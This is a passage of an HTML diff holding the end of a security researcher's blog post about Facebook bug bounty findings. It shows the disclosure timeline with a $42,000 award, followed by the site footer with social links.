+<li>Aug 12, 2021&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 13, 2021&mdash;  Acknowledged by Facebook<br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 17, 2021&mdash; Fixed by Facebook<br>Sep 2, 2021 &mdash; $42000 bounty  awarded by Facebook.</li>
+</ol>
+<p><!-- /wp:list --></p>
+
+  </div><a class="u-url" href="/uncategorized/2021/09/03/more-secure-facebook-canvas-applications-tale-of-126k-worth-of-bugs-that-lead-to-facebook-account-takeovers.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
